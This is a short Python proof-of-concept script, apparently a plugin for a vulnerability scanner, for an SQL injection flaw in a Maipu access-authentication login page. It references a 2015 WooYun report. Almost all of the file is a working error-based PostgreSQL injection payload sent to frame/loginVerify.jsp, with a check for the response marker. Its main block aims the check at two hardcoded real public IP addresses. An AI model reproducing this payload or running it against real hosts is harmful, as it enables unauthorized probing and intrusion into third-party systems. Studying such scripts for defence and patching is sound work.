#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  迈普某接入认证系统设备存在SQL注入
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0137572

 
 
"""
import urlparse
import time

def assign(service, arg):
    if service == 'mpsec':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    payload = "frame/loginVerify.jsp"
    url = arg + payload
    data = "userName=admin' AND 3311=CAST((CHR(113)||CHR(118)||CHR(113)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3311=3311) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(118)||CHR(98)||CHR(113)) AS NUMERIC) AND 'vqzn'='vqzn&password=admin"
    code, head, res, errcode, _ = curl.curl2(url ,data) 
    if code==500 and 'qvqjq1qjvbq' in res:
        security_hole(url)
    

    

if __name__ == '__main__':
    from dummy import *
    audit(assign('mpsec', 'http://61.184.196.50/')[1])
    audit(assign('mpsec', 'http://218.64.77.171:8000/')[1])